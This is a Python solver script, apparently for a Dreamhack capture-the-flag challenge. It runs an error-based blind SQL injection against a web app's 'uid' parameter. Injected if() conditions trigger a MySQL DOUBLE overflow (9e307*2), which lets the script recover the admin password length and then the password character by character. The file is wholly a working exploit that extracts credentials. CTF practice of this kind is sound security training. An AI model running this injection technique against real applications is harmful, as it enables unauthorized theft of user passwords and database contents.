import requests
import sys
import string

class Solver:
    def __init__(self, port: str) -> None:
        self._URL = f"http://host3.dreamhack.games:{port}/?uid="
    
    def _request(self, query: str) -> bool:
        res = requests.get(self._URL + query)
        return res
    
    def _sqli(self, query: str) -> requests.Response:
        res = self._request(query)
        return res
    
    def _find_pw_length(self, user: str, min_length, max_length) -> int:
        for idx, num in enumerate(range(min_length, max_length + 1)):
            query = f"{user}' and if(length(upw) = {num}, 9e307*2, False) %23"
            res = self._sqli(query=query).text
            # print(f'{idx} : {res}')
            if "DOUBLE" in res:
                return num
            
    def _find_FLAG(self, user: str, pw_len: int) -> str:
        FLAG = ""
        for idx, num in enumerate(range(1, pw_len + 1)):
            for prta in string.printable:
                query = f"{user}' and if(substr(upw, {num}, 1)='{prta}', 9e307*2, False) %23"
                res = self._sqli(query=query).text
                # print(f'{idx} : {res}')
                if "DOUBLE" in res:
                    FLAG += prta
                    break
        return FLAG
    
    def solve(self):
        pw_len = solver._find_pw_length("admin", 0, 100)
        print(f'[*]Lengh of admin password is : {pw_len}')
        flag = solver._find_FLAG("admin", pw_len)
        print(f'[*]flag is : {flag}')
        
if __name__ == "__main__":
    port = sys.argv[1]

    solver = Solver(port=port)
    solver.solve()